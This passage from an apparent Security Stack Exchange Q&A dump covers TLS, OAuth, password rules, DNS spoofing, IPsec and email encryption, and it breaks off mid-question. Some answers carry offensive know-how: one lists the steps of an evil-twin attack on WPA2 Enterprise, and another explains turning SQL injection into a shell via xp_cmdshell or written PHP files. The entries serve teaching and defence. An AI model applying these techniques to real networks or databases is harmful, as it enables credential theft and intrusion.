<p>Note also that the first server chose <code>DHE-RSA-AES256-SHA</code> as cipher suite, i.e. a suite which uses the block cipher AES in CBC mode. This first server is then potentially vulnerable to both BEAST and CRIME. The second server selected <code>ECDHE-RSA-RC4-SHA</code>, which is BEAST-immune.</p>

<p>(First server is mine; since I do not use cookies at all on it, I am not nervous about cookie-stealing attacks. Second server is <code>www.google.com</code>.)</p>

<p>If I find the time, I will write a tool which gives such results more easily. There is no need to do a full SSL/TLS handshake, only to send a ClientHello et look at the ServerHello which comes back.</p>
","20385"
"OAuth 2 vs OpenID Connect to secure API","18821","","<p>I am developing a Web API which will back several applications: a website, a companion mobile application(s) and possibly several third-party applications. Every application is expected to get an access token from auth server and then feed it to the API, user will enter their credentials either on auth server web interface (for third-party applications) or directly in the website or app (for ""trusted"" applications). The client apps themselves are not expected to require user identity.</p>

<p>I've started implementing it via OAuth 2, and it matches my use cases exactly. But later I found several discussions in the 'net that sent me thinking whether my scenario really requires OpenID Connect, and now, after a few thousands of words read I still cannot <em>grok</em> which one is better for my case.</p>

<p>(For example, GitHub, which roughly matches my use cases, <a href=""https://developer.github.com/v3/oauth/"" rel=""noreferrer"">uses</a> OAuth 2)</p>

<p>I'd like to hear some guidelines on how does one choose whether one's API requires OAuth 2 or OpenID Connect.</p>

<p><strong>Update</strong></p>

<p>What confuses me is the following: there is a valid point in not using OAuth for <em>authentication</em>. But consider this case (assume that there's a simple business rule: each user can see only their own documents):</p>

<ul>
<li>app goes to auth server for token</li>
<li>user authorizes the app, so the token is granted</li>
<li>app goes to api with the token for data</li>
<li>api returns documents for user that authorized the token (so somehow the token can be traced back to user)</li>
</ul>

<p>Is this an authentication scenario or authorization scenario?</p>

<p>PS. I am aware of <a href=""https://security.stackexchange.com/questions/37818/why-use-openid-connect-instead-of-plain-oauth"">this question</a>, but the best answer there doesn't address my doubts.</p>
","<p>From what you have explained it seems that OAuth 2.0 would better suit your needs. OpenID Connect was developed to add secure authentication to OAuth 2.0. Large providers i.e. Google, Facebook, Yahoo, etc began using OAuth 2.0 as a way to authenticate users with ""login with"" services so users could use their credentials to authenticate to a variety of third-party services. Standard OAuth 2.0 cannot securely satisfy this requirement because of deficiencies within the protocol. OpenID Connect solves these deficiencies and allows providers to securely use OAuth 2.0 as an authentication framework. OAuth 2.0 was originally developed as an authorization framework which allows a user to grant a third party service access to their data stored on the provider. The scenario you described seems like exactly what OAuth 2.0 was developed to do. If you do not plan to offer a ""login with"" mechanism use OAuth 2.0.</p>

<p>If a user will have their own credentials for the third-party services and not use your providers credentials to log into the service, you won't need OpenID Connect.</p>

<p><a href=""http://www.thread-safe.com/2012/01/problem-with-oauth-for-authentication.html"">This</a> was the most useful resource I found. It's a blog post by one of the designers of OpenID Connect that addresses Facebook's different uses for OAuth 2.0. </p>
","95328"
"Password rules: Should I disallow ""leetspeak"" dictionary passwords like XKCD's Tr0ub4dor&3","18813","","<p>TLDR: We already require <a href=""https://en.wikipedia.org/wiki/Two-factor_authentication"">two-factor authentication</a> for some users. I'm hashing, salting, and doing things to encourage long passphrases. I'm not interested in the merits of password complexity rules in general. Some of this is required by law, and some of it is required by the customer. My question is fairly narrow: Should I detect  leetspeak passwords such as Tr0ub4dor&amp;3 as being a dictionary word, and therefore fail passwords that primarily consist of a single dictionary word (even if leeted).  Multiple word passphrases are always accepted regardless of leetness or not, this is only a question about those who choose to use more traditional short passwords.</p>

<p>I am the lead developer for an upcoming government website which will expose sensitive personal information (criminal history, <a href=""https://en.wikipedia.org/wiki/Social_Security_number"">SSNs</a>, etc. primarily). The website will be consumed by the general public, for doing background checks on employees, etc.</p>

<p>On the backend, I'm storing the passwords hashed with PBKDF2 salted on a per-user basis with very high iterations, so brute force hashing attacks against stronger passwords are not realistic (currently), and the website locks the user out for 10 min after five bad tries, so you can't brute force really that way either.</p>

<p>I'm getting some pushback from my customer/partners about the severity of the password rules I have implemented.</p>

<p>Obviously I want people to use 16-20+ char passphrases, but this is a slow moving bureaucracy. So in addition to allowing/encouraging those good passwords, I have to allow some shorter ""hard"" passwords. I'm just trying to limit our exposure.</p>

<p>In particular the ""no dictionary word"" requirement is causing people frustration, as I disallow the classic leetspeak passwords such as <a href=""http://www.explainxkcd.com/wiki/index.php/936:_Password_Strength"">XKCD's famous Tr0ub4dor&amp;3</a>. (For those curious, I run the proposed password through a leetspeak permutation translator (including dropping the char) and then compare each permutation against a dictionary)</p>

<p>Am I being too severe? I am a big proponent of ""Avids rule of usability"" -  Security at the expense of usability comes at the expense of security. But in this case I think it's more an issue of habit/education. I allow diceware/readable passphrase passwords with no restrictions, only the ""normal"" passwords get the stronger requirements. <a href=""https://security.stackexchange.com/questions/6095/xkcd-936-short-complex-password-or-long-dictionary-passphrase/6116#6116"">XKCD #936: Short complex password, or long dictionary passphrase?</a></p>

<p>Should I try to solve this with just better UI help? Should I stick to my guns? The multiple recent high-profile hacks, especially ones that exposed passwords makes me think I'm in the right, but I also don't want to make things stupid for no reason. Since I'm protected from brute force attacks fairly well (I think/hope), is this unnecessary complexity? Or just good defense in depth?</p>

<p>For those that can't grok passphrases or truly random passwords the ""two words plus num/symbols"" passwords seem to be both easy enough, and at least harder to hack, if I can get people to read the instructions...</p>

<p>Ideas:</p>

<ul>
<li>Better password hints/displayed more prominently (too subjective?)</li>
<li>Better strength meter (something based on zxcvbn? - would fail the dictionary words on the client side rather than after a submit)</li>
<li>Disallow all ""short"" passwords, force people to use only passphrases, which makes the rules simpler?</li>
<li>""make me a password"" button that generates a passphrase for them and makes them copy it into the password fields</li>
<li>Give up and let the leetspeek passwords through?</li>
</ul>

<p>Heres what I currently have in my password instructions/rules:</p>

<ul>
<li><p>16 character or longer passphrase (unlimited max)</p>

<p>or</p></li>
<li><p>At least eight characters</p></li>
<li>Contain three of the following

<ul>
<li>UPPERCASE</li>
<li>lowercase</li>
<li>Numbers 0123456789</li>
<li>Symbols !@#$%^&amp;*()_-+=,./&lt;>?;:'""</li>
</ul></li>
<li>Not based on a dictionary word</li>
<li>Not your username</li>
</ul>

<p>Examples of passwords that won't be accepted</p>

<ul>
<li>Troubador (Single dictionary word)</li>
<li>Troubador&amp;3 (Single dictionary word plus numbers and symbols)</li>
<li>Tr0ub4dor&amp;3 (Based on single dictionary word)</li>
<li>12345678 (Does not contain 3/4 character types)</li>
<li>abcdefgh (Does not contain 3/4 character types)</li>
<li>ABCDEFGH (Does not contain 3/4 character types)</li>
<li>ABCdefgh (Does not contain 3/4 character types)</li>
<li>ABC@#$%! (Does not contain 3/4 character types)</li>
<li>ab12CD (Too Short)</li>
</ul>

<p>Examples of passwords that will be accepted (do not use any of these passwords):</p>

<ul>
<li>correct horse battery staple (Diceware password)</li>
<li>should floating things fashion the mandate (Readable passphrase - link to makemeapassword.org)</li>
<li>GoodPassword4! (multiple words, upper, lower, numbers, symbols)</li>
<li>Yyqlzka6IAGMyoZPAGpP (random string using uppercase, lowercase, and numbers)</li>
</ul>
","<p>An index of <a href=""https://en.wikipedia.org/wiki/Password_strength#Entropy_as_a_measure_of_password_strength"" rel=""nofollow noreferrer"">entropy</a> values (<strong>divide times by the number of nodes</strong>—state actors have <em>lots</em> of nodes):</p>

<pre>
                                                           BIT ~RAND CRACK  CRACK
DICTIONARY                                       COUNT ENTROPY CHARS   MD5 PBKDF2
̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅   ̅ ̅ ̅ ̅ ̅  ̅ ̅ ̅ ̅ ̅ ̅ ̅  ̅ ̅ ̅ ̅ ̅   ̅ ̅ ̅ ̅   ̅ ̅ ̅ ̅ ̅ 
Alphamumerics (letters, numbers)                    62    5.95   0.9    0s    0s
Random printable char (any key on a US keyboard)    94    6.55   1.0    0s    0s
Diceware dictionary word                          7776   12.92   2.0    0s    0s
Standard American English (en_US) dict word       100k   16.61   2.5    0s    0s
Large American English dictionary word            650k   19.31   2.9    0s    1s
Any word in any Wikipedia (any language)         58.4M   25.80   3.9    0s   58s

Standard en_US dictionary with raNDomIZed cASE    6.3M   22.60   3.4    0s    6s
Standard en_US dictionary with l33t variations    6.3M   22.60   3.4    0s    6s
Std en_US w/ typos + (either rand case or leet)    38M   25.18   3.8    0s   38s
Std en_US w/ rand case + typos + leet             2.4B   31.18   4.8    0s   41m
Wikipedia word with raNDomIZed cASE (or l33t)     3.7B   31.80   4.9    0s    1h
Wikipedia word w/ typos + (rand case xor leet)     22B   34.39   5.2    0s    6h

rand order: 5 lower, 1 special, 1 num, 1 upper    1e11   36.52   5.6    2s    1d
rand order: 6 lower and two of upper/num/special  4e11   38.67   5.9   10s    5d
rand order: 6 lower, 1 spec/upper, yr 1900-2100   4e12   41.70   6.4    1m   49d
rand order: 7 lower and two of upper/num/special  1e13   43.37   6.6    4m  131d
rand order: 8 lower and two of upper/num/special  3e14   48.07   7.3    2h    4y*

4 word diceware passphrase                        4e15   51.70   7.9    2d    8y*
8 char (random printable) passcode                6e15   52.44   8.0    2d    9y*
5 word diceware passphrase                        3e19   64.62   9.9    6y*  27y*
10 char (random printable) passcode               5e19   65.55  10.0    6y*  29y*
4 standard en_US words                            1e20   66.44  10.1    7y*  31y*
3 std en_US words and one large en_US word        6e20   69.10  10.5   11y*  35y*
3 std en_US words and 3 random printable chars    8e20   69.46  10.6   12y*  35y*
6 word diceware passphrase                        2e23   77.55  11.8   26y*  47y*
</pre>

<p><sup>""Any Wikipedia"" includes Wiktionary, Wikibooks, etc, in all languages, with <a href=""http://blog.sebastien.raveau.name/2009/03/cracking-passwords-with-wikipedia.html"" rel=""nofollow noreferrer"">58.4M unique words</a> in 2009. <a href=""http://world.std.com/~reinhold/diceware.html"" rel=""nofollow noreferrer"">Diceware</a> was the basis for the <a href=""https://security.stackexchange.com/questions/6095/xkcd-936-short-complex-password-or-long-dictionary-passphrase"">xkcd comic</a>. I assume a word size of six characters for random mixed case (so there are 2⁶ extra iterations) and I assume leet variations are as plentiful as mixed case. I'm using a value of six for intentional typos/misspellings.</sup></p>

<p><sup>Crack times are estimates for top-of-line single node cracking systems, with upgrades every 18mo to account for <a href=""https://en.wikipedia.org/wiki/Moore%27s_law"" rel=""nofollow noreferrer"">Moore's Law</a> (when you see an asterisk, <code>*</code>). A space is considered cracked when half of it has been examined. <a href=""https://www.trustedsec.com/june-2016/introduction-gpu-password-cracking-owning-linkedin-password-dump/"" rel=""nofollow noreferrer"">GPU-&#8203;based cracking</a> can test MD5s at <a href=""http://thepasswordproject.com/oclhashcat_benchmarking"" rel=""nofollow noreferrer"">23B/s</a> on a <em>single computer node</em>. <a href=""https://en.wikipedia.org/wiki/PBKDF2"" rel=""nofollow noreferrer"">PBKDF2</a> is more robust, estimated at <a href=""https://blog.agilebits.com/2013/04/16/1password-hashcat-strong-master-passwords/"" rel=""nofollow noreferrer"">300k/s</a> on a 4 GPU system in 2013 (27mo ago → 2<sup>27/18</sup>, so 300k × 2.828 = 849k/s → rounded to 1M/s).</sup></p>

<p>&nbsp;</p>

<p>The question was clarified in the <a href=""https://security.stackexchange.com/questions/93611/password-rules-should-i-disallow-leetspeak-dictionary-passwords-like-xkcds-t/93616#comments-93616"">comments to my other answer</a> (which I'm leaving since it may still be helpful). It's really just asking about whether or not to allow <a href=""https://en.wikipedia.org/wiki/Leet"" rel=""nofollow noreferrer"">leetspeak</a>. Two factor authentication is already in use for high security areas.</p>

<p>The word ""troubador"" is not in my standard dictionary but is in my large dictionary. Capitalizing the first letter of a word is <em>not</em> random mixed case (it's a common <a href=""https://blog.korelogic.com/blog/2014/04/04/pathwell_topologies"" rel=""nofollow noreferrer"">password topology</a>), so it only doubles the count. Its random printable character equivalent is therefore <code>log₂(650k × 2⁶ × 2) / 6.55</code> which is only four characters!</p>

<p>Therefore <code>Tr0ub4dor&amp;3</code> is equivalent to <strong>six</strong> random printable characters of complexity. A weak password, yet about as strong as most passwords people create to minimally fit complexity requirements.</p>

<p><strong>If six random characters is too weak, you should disallow ""leetspeak"" dictionary passwords.</strong></p>

<p>To be fully thorough, you may also want a large dictionary so you can count words as I have, otherwise a password like <code>presidentclinton</code> (33.22 bits, 5 chars, lower in reality due to being related) would be accepted by your system.</p>
","93628"
"DNS Spoofing vs DNS Cache Poisoning","18785","","<p>What is the difference between DNS Spoofing and DNS Cache Poisoning ???</p>

<p>It seems like there are little differences between two attacks, with an exception that DNS server is actually might cache the ""fake"" response from malicious DNS server. </p>
","<p>Despite what Wikipedia may say, they are not the same.  Roughly speaking, DNS cache poisoning is one way to do DNS spoofing, but there are other ways to do it, too.</p>

<p>DNS spoofing refers to the broad category of attacks that spoof DNS records.  It is a category of attacks (an end goal of the attack, rather than a particular attack mechanism).  There are many different ways to do DNS spoofing: compromise a DNS server, mount a DNS cache poisoning attack (such as the <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1447"">Kaminsky attack</a> against a vulnerable server), mount a man-in-the-middle attack (if you can get access to the network), guess a sequence number (maybe making many requests), be a false base station and lie about the DNS server to use, and probably many more.</p>

<p>DNS cache poisoning is one way to do DNS spoofing.  DNS cache poisoning refers to the following scenario: many end users use the same DNS cache, and an attacker manages to inject a forged DNS entry into that cache.  For example, many ISPs will run a caching DNS server and arrange for their customers (the end users) to all try the ISP's server first.  If an attacker can find some way to get the caching DNS server to cache an incorrect record, then the attacker is set: he has managed to successfully spoof DNS records and affect all the end users who rely upon that cache.</p>

<p>How does an attacker manage to poison a DNS cache?  Well, one common way is to mount some DNS spoofing attack on the DNS request from the cache to the ultimate DNS server.  Yes, I realize this gets a little recursive. :-)  Basically, you use any DNS spoofing attack to get the cache to accept a spoofed record (here you can use any DNS spoofing attack that you can).  Afterwards, the result is that the cache will cache that bogus record, and consequently many end users will now accept that spoofed record too.</p>
","33318"
"Which is better for server-to-server-communication: IPSec or TLS?","18777","","<p>Maybe you could help me with a small problem.</p>

<p>Would you recommend IPSec or TLS for a Server-to-Server-Connection? I need two or three arguments for reasoning a decision within my final paper, but sadly didn't find a criterion for an exclusion. The reflection of IPSec and TLS within my thesis is only a minor aspect, therefore, one or two main reasons for selecting TLS or IPSec would be enough. Do you think the possible compression within IPSec could be one of these main reasons?</p>

<p><strong>More complete explanation of the scenario:</strong></p>

<p>A user wants to login on a portal to make use of a service. The portal backend consists of the portal itself, a registration authority, user management, access control authority etc. Should I choose TLS or IPSec to secure those Backend connections? The delivered service does not have to be positionated within the backend, but it is reliable and is only connected with the portal. Here's a list with the connections I want to secure:</p>

<p>service (may be an external one) ---- portal</p>

<p>registration authority ---- user management</p>

<p>portal ---- user management</p>

<p>for a user-server-connection I've already made my decision, but the reasons I've used for this decision, doesn't work for a server-to-server-connection.</p>

<p>Thanks a lot in advance!</p>

<p><strong>A picture of the scenario:</strong></p>

<p>(red = problematic connection)</p>

<p><img src=""https://i.stack.imgur.com/ux7QP.jpg"" alt=""enter image description here""></p>

<p>(in fact the model is by far larger, since I treat also other mechanisms like authentication, storage-mechanisms, storage access, access control, software-architecture, including possible technologies and so on. Therefore, securing the connections is only a partial aspect)</p>
","<p>There are two main usage modes for <a href=""http://en.wikipedia.org/wiki/IPsec"" rel=""nofollow noreferrer"">IPsec</a>: <strong>AH</strong> and <strong>ESP</strong>. <em>AH</em> is only for authentication, so I suppose that you are talking about an ESP tunnel between the two servers. All IP packets get encrypted and authenticated, including some header details such as the source and target ports. There are several encryption and MAC algorithms which can be used with IPsec; AES (CBC mode, 128-bit key) and HMAC/SHA-1 (truncated to 96 bits) are fine, and are <a href=""http://tools.ietf.org/html/rfc4835#section-3.1.1"" rel=""nofollow noreferrer"">MUST-implement</a>, so any conforming IPsec implementation should support them.</p>

<p>For this ""tunnelling"" part, IPsec does things correctly, and so does TLS (assuming TLS 1.1 or 1.2, for IV selection with block ciphers in CBC mode). In fact IPsec can be deemed to be ""more correct"" than TLS because it uses encrypt-then-MAC instead of MAC-then-encrypt (see <a href=""https://crypto.stackexchange.com/questions/202/should-we-mac-then-encrypt-or-encrypt-then-mac"">this</a>); however, properly implemented TLS 1.1 or 1.2 will be fine too. Practical differences will occur at other levels:</p>

<ul>
<li><p>To encrypt and decrypt data, your two servers must first agree on a shared secret. This is what the <em>handshake</em> in TLS is about; the equivalent in IPsec would be <a href=""http://en.wikipedia.org/wiki/Internet_Key_Exchange"" rel=""nofollow noreferrer"">IKE</a>. You might want to rely on <a href=""http://en.wikipedia.org/wiki/X.509"" rel=""nofollow noreferrer"">X.509 certificates</a>; or maybe on a ""shared key"" manually configured in both servers. Both TLS and IPsec support both, but any <em>specific implementation</em> of either may make one option easier or more complex than the other.</p></li>
<li><p>IPsec acts at the OS level; application software needs not be <em>aware</em> of the presence of IPsec. This is great in some cases, not so great in others. On the one hand, it allows some legacy applications to be ""secured"" with IPsec even if this was not envisioned during application development; and the security management can be done without being constrained by what the application developers thought of (for instance, if using X.509 certificates, you can enforce revocation checks, whereas a TLS-powered application might use a library which does not support CRL). On the other hand, with IPsec, applications cannot do anything application-specific with security: a server may not, for instance, vary its security management depending on which other server is talking to it.</p></li>
<li><p>Though TLS is normally used applicatively, it is also possible to use it as building block for an OS-level <a href=""http://en.wikipedia.org/wiki/Virtual_private_network"" rel=""nofollow noreferrer"">VPN</a> between the two servers. This basically means using TLS as if it was IPsec.</p></li>
<li><p>IPsec being OS-level, its operation implies fiddling with OS-level network configuration, whereas TLS can usually be kept at application level. In big organizations, Network people and application people tend to live in separate worlds (and, sadly, are often at war with each other). Keeping everything at the application layer may make the deployment and management easier, for organizational reasons.</p></li>
</ul>

<p><strong>Summary:</strong> it depends. Use IPsec if you want to apply it on uncooperative applications (e.g. an application which does not natively support any kind of protection for its connections to other servers). Use TLS if you want to abstract away OS-level configuration. If you still want to use TLS and yet do so at OS level, then use a TLS-powered VPN.</p>
","42993"
"What steps do Gmail, Yahoo! Mail, and Hotmail take to prevent eavesdropping on email?","18755","","<p>I would like to ask what happens when an email is sent from gmail, yahoo or hotmail public web email services?</p>

<p>I don't understand email protocols in details, but as far as I know email traffic is unencrypted and the messages are passed along many mail servers (in plain text) before reaching their destination server. However, this was questioned recently by other people, and their view was that if one of the big providers is used, the email messages are encrypted and there is no need to worry about security.</p>

<p>Do you know if they are right about this and are emails moderately secure?
Thank you!</p>
","<p>An SMTP session between two mail servers <em>may</em> be encrypted, but only <strong>if</strong> both ends support it and <strong>if</strong> both ends choose to use it.  So if you're sending mail from Gmail to example.net, then Google could only encrypt if example.net was ready and willing.  For this reason, you cannot trust email to be even moderately secure at the transport layer. (The only safe end-to-end method is to encrypt your email using S/MIME or PGP, but the people you're exchanging email with need to be on board too... just like the mail servers).</p>

<p>As to whether the big three are performing opportunistic STARTTLS, I haven't seen any evidence of it, but I spend less time reading my mail server logs than I used to.  And if they are, they're still only half of every SMTP connection they make, and cannot guarantee the use of encryption.</p>

<h2>Update:</h2>

<p>I just banner tested MX hosts for gmail.com, yahoo.com, and hotmail.com.  Only gmail advertises STARTTLS, which is to say, only gmail would be willing to encrypt the SMTP session if the other party wanted to.  </p>

<p>I tested gmail outbound by sending mail to a server I own and watching the wire; Google does indeed take advantage of STARTTLS if it is offered and encrypts the SMTP transaction when a gmail user is sending mail.  Props to Google.</p>

<p>So as far as ""sending"" email encryption goes: Google 1, Yahoo 0, Microsoft 0.</p>

<hr>

<p>As per the comments below, if you want to test these yourself, it's very simple:</p>

<ol>
<li>Determine the MX hosts (Mail eXchangers) for the domain </li>
<li>Telnet to port 25 on one of them</li>
<li>Type in ""ehlo yourhostname.domain.com""</li>
<li>If you don't see ""250-STARTTLS"" as one of the responses, they don't support opportunistic encryption.</li>
</ol>

<p>Like this:</p>

<pre><code>$ host -t mx yahoo.com
yahoo.com mail is handled by 1 mta5.am0.yahoodns.net.
yahoo.com mail is handled by 1 mta7.am0.yahoodns.net.
yahoo.com mail is handled by 1 mta6.am0.yahoodns.net.
$ telnet mta5.am0.yahoodns.net 25
Trying 66.196.118.35...
Connected to mta5.am0.yahoodns.net.
Escape character is '^]'.
220 mta1315.mail.bf1.yahoo.com ESMTP YSmtpProxy service ready
ehlo myhost.linode.com
250-mta1315.mail.bf1.yahoo.com
250-8BITMIME
250-SIZE 41943040
250 PIPELINING
quit
221 mta1315.mail.bf1.yahoo.com
Connection closed by foreign host.
$
</code></pre>

<p>As a side note, Yahoo will close the connection if you don't ehlo right away.  I had to cut &amp; paste my ehlo because typing it in took too long.</p>

<p><strong>MORE UPDATE:</strong></p>

<p>As of January 2014, Yahoo is now encrypting - I just tested (as above) and verified.  However, both <a href=""http://www.theregister.co.uk/2014/01/09/yahoo_always_on_crypto_unstrong/"">The Register</a> and <a href=""http://www.computerworld.com/s/article/9245258/Yahoo_email_encryption_standard_needs_work?taxonomyId=17"">Computerworld</a> are reporting that the intracacies of SSL setup (such as Perfect Forward Secrecy) leave a lot to be desired as implemented by Yahoo.</p>

<p><strong>EVEN MORER UPDATE:</strong></p>

<p>Google is now including SMTP encryption data in their <a href=""http://www.google.com/transparencyreport/saferemail/"">Transparency Report Safer Email section</a>.  They're sharing their data about who else is willing to encrypt, and you can look at the top numbers as well as query individual domains.</p>

<p><strong>Addendum:</strong></p>

<p>@SlashNetwork points out that it is possible to configure a mail server to <strong>require</strong> that TLS be negotiated before exchanging mail.  This is true, but to quote the <a href=""http://www.postfix.org/TLS_README.html#how"">Postfix documentation</a>:</p>

<blockquote>
  <p>You can ENFORCE the use of TLS, so that the Postfix SMTP server
  announces STARTTLS and accepts no mail without TLS encryption, by
  setting ""smtpd_tls_security_level = encrypt"". According to RFC 2487
  this MUST NOT be applied in case of a publicly-referenced Postfix SMTP
  server. This option is off by default and should only seldom be used.</p>
</blockquote>

<p>Now, the world is full of implementations that violate the RFCs, but this sort of thing - e.g., something that may break routine required functionality like accepting bounces and mail for the postmaster - is probably more likely to have negative consequences.</p>

<p>A better solution which mail gateways often allow is the imposition of <a href=""http://www.postfix.org/TLS_README.html#client_tls_policy"">TLS requirements on a per-domain policy basis</a>.  For example, it is usually possible to say ""Require TLS with a valid Certificate signed by Entrust when talking to example.com"".  This is usually implemented between organizations that are part of the same parent company but have different infrastructure (think: acquisitions) or organizations with a business relationship (think: ACME, Inc., and their outsourced support call center company).  This has the advantage of ensuring that specific subsets of mail that you care about get encrypted, but doesn't break the open  (accept from anyone by default) architecture of SMTP email.</p>

<p><strong>Addendum++</strong></p>

<p>Google has announced the <a href=""http://gmailblog.blogspot.com/2016/02/making-email-safer-for-you-posted-by.html"">gmail will percolate information about the security if the mail path out to the reader</a>.  So these behind-the-scenes encryption steps will be brought to the notice of the user a little bit more.</p>

<p>(Probably still doesn't care about the certificate provenance; just an indicator of encryption of bits).</p>
","6492"
"Is it possible to use the aircrack-ng tool to crack a WPA2 Enterprise network?","18752","","<p>is this tool (aircrack-ng) capable of cracking into a WPA/WPA2 Enterprise network? This tool has major success cracking the passwords of WEP/WPA networks.</p>

<p>If it can, how, but if not, is there another tool that could be used to accomplish this?</p>

<p>Also, what can be done to prevent this type of attack on a network?</p>
","<p>Not alone like a WPA/2 PSK attack, where you can simply capture the handshake and bruteforce. </p>

<p>You'll need to capture the ""Enterprise"" authentication attempt. To do this, you can perform an ""Evil Twin"" attack that captures the authentication attempt, which can then be subsequently cracked. </p>

<p>Here's an excellent presentation by Matt Neely of SecureState that details the attack: <a href=""http://www.slideshare.net/NEOISF/attacking-and-securing-wpa-enterpris"">http://www.slideshare.net/NEOISF/attacking-and-securing-wpa-enterpris</a></p>

<p>Specific Steps of the Attack:</p>

<ul>
<li>Attacker sets up a Fake AP
<ul>
<li>Mirror the target SSID, encryption type and band</li>
<li>Configure the AP to accept Enterprise authentication</li>
<li>Enable AP, ensure it is visible to the target</li>
</ul></li>
<li>Connect the AP to a FreeRADIUS (with password Wireless Pwnage Edition patch) server that captures auth</li>
<li>Deauth any target you can get within range of your fake AP</li>
<li>Wait for targets to attach to the the fake AP, capture their authentication</li>
<li>Crack the challenge / response pair to recover the password</li>
</ul>

<p>Hope this helps!</p>
","29611"
"What is the significance of the version field in a TLS 1.1+ ClientHello message?","18722","","<p>I am trying to add TLS 1.1 and 1.2 support to a packet capture product which already has TLS 1.0 support.</p>

<p>I have used Wireshark to capture traffic between my browser and an openssl server to generate some test cases. I have seen an unexpected TLS version flowing in all the traces I have created. </p>

<pre><code>Secure Sockets Layer
    TLSv1.2 Record Layer: Handshake Protocol: Client Hello
        Content Type: Handshake (22)
        Version: TLS 1.0 (0x0301)
        Length: 105
        Handshake Protocol: Client Hello
            Handshake Type: Client Hello (1)
            Length: 101
            Version: TLS 1.2 (0x0303)
</code></pre>

<p>The above is an extract from one of the TLS 1.2 traces as reported by Wireshark. The version given is TLS 1.0 in the ClientHello and 1.2 in all subsequent messages. This happened in both the TLS 1.1 and 1.2 traces.</p>

<p>Appendix E.1. (Compatibility with TLS 1.0/1.1 and SSL 3.0) from the TLS 1.2 RFC says:</p>

<pre><code>Earlier versions of the TLS specification were not fully clear on
what the record layer version number (TLSPlaintext.version) should
contain when sending ClientHello (i.e., before it is known which
version of the protocol will be employed).  Thus, TLS servers
compliant with this specification MUST accept any value {03,XX} as
the record layer version number for ClientHello.
</code></pre>

<p>That in itself is also a little ambiguous to me.</p>

<p>So my questions are:</p>

<ul>
<li>Can this field be a completely arbitrary value (as long as it is SSLv3 or higher)?</li>
<li>Will the behaviour change depending on the version given in this field?</li>
<li>Is there some significance to the browser choosing TLS 1.0 rather than SSLv3?</li>
</ul>

<p>Related:</p>

<ul>
<li><a href=""https://security.stackexchange.com/a/26059/7866"">https://security.stackexchange.com/a/26059/7866</a> This answer suggests that SSLv3 should be used in the ClientHello for maximum interoperability. The mention of interoperability implies that the server cares about what value is given.</li>
</ul>
","<p>Version fields occur in three places:</p>

<ul>
<li>as part of the header for each <em>record</em> that the client and the server send;</li>
<li>as part of the <code>ClientHello</code> message from the client;</li>
<li>as part of the <code>ServerHello</code> message from the server.</li>
</ul>

<h2><strong>Protocol Version Negotiation</strong></h2>

<p>The version field in the <code>ClientHello</code> is the maximum version supported by the client implementation. For instance, when the client puts 0x0302 in this field (that's the conventional value meaning ""TLS 1.1""), the client tells the server: ""I am ready to handle all protocol versions up to TLS 1.1"". The version field in the <code>ServerHello</code> message from the server specifies which protocol version will be used for this connection. The server <em>should</em> use the highest protocol version that both client and server support.</p>

<p>The client should not announce support for a protocol version that it does not actually support, lest a server would choose such a version, mistakenly believing that the client indeed supports it.</p>

<h2><strong>About Records</strong></h2>

<p>The <code>ClientHello</code> from the client is sent wrapped into one or several <em>records</em>, and each record contains the protocol version as well. The records are like the envelopes around letters. It is safe to use version 0x0300 (SSLv3) for these records, regardless of the maximum supported version indicated in the <code>ClientHello</code>; that's like sending a letter in an SSLv3 envelope, but the letter says ""by the way, I also support TLS 1.0 and TLS 1.1"". Using SSLv3 records maximizes interoperability with old and buggy implementations who know only of SSLv3 and would reject records with a higher version.</p>

<p>The response from the server states the protocol version which will be used, and should come as records bearing that version. E.g. if the server says ""TLS 1.1"" in its <code>ServerHello</code> then that <code>ServerHello</code> should come wrapped into a record also tagged as ""TLS 1.1""; and all subsequent records from both client and server should use that version.</p>

<h2><strong>Interoperability</strong></h2>

<p><em>Theoretically</em>, a server should accept any value greater than or equal to 0x0300 in a version field, and should not complain if it contains, e.g. 0xA7C0 (meaning ""TLS 165.193"", a fictitious version which will probably never be defined). This holds for both the <code>ClientHello</code> message, and the record headers. The protocol version impacts the encoding of records, but the first records are in cleartext (no cryptography), and for them the version can be ignored because cleartext is cleartext (SSL 3.0, TLS 1.0, TLS 1.1 and TLS 1.2 cleartext records differ only by the version specified in the header, but are otherwise identical).</p>

<p><em>In practice</em>, there are reports of widely deployed implementations which do not tolerate ""version"" fields where the first byte is not 0x03. There even are implementations which do not support a <code>ClientHello</code> which specifies a version higher than 0x0301 (aka TLS 1.0).</p>

<p>To minimize issues, a client:</p>

<ul>
<li>shall use SSL 3.0 in the records for the <code>ClientHello</code>;</li>
<li>should specify its highest supported version in the <code>ClientHello</code>;</li>
<li>may fallback, on failure, to trying the <code>ClientHello</code> again, this time claiming a lower maximum supported version (to accomodate old servers which get a stroke when they see ""TLS 1.1"" or ""TLS 1.2"").</li>
</ul>
","32790"
"Leveraging a shell from SQL injection","18720","","<p>As I understand it, SQL injection should only allow for the manipulation and retrievial of data, nothing more. Assuming no passwords are obtained, how can a simple SQL injection be used to leverage a shell?</p>

<p>I have seen attacks where this has been claimed to be possible, and if it is I would like to be able to protect against it.</p>
","<p>Many common SQL servers support functions such as <strong><a href=""http://msdn.microsoft.com/en-us/library/aa260689%28v=sql.80%29.aspx"">xp_cmdshell</a></strong> that allow the execution of arbitrary commands. They are not in the SQL standard so every database software has different names for it. </p>

<p>Furthermore there is SELECT ... INTO OUTFILE, that can be used to <strong>write arbitrary files</strong> with the permissions of the database user.  It may be possible to overwrite shell scripts that are invoked by cron or on startup. If the database server process is running on the same server as a web application (e. g. a single rented server), <a href=""http://www.greensql.com/articles/backdoor-webserver-using-mysql-sql-injection"">it may be possible to write .php files</a> that can then be invoked by visiting the appropriate url in the browser.</p>

<p>The third way to cause damage is to define and execute <strong>stored procedures</strong> in the database. Or redefine existing stored procedures, for example a function that verifies passwords.</p>

<p>There are likely more ways.</p>

<p>The application database user should neither have permissions to execute the shell functions nor use INTO OUTFILE nor to define stored procedures.</p>
","6924"
"Will JavaScript be executed which is in an HREF?","18716","","<p>I located an issue with a site where I can insert a script tag into the <em>href</em> of an <em>anchor</em> tag:</p>

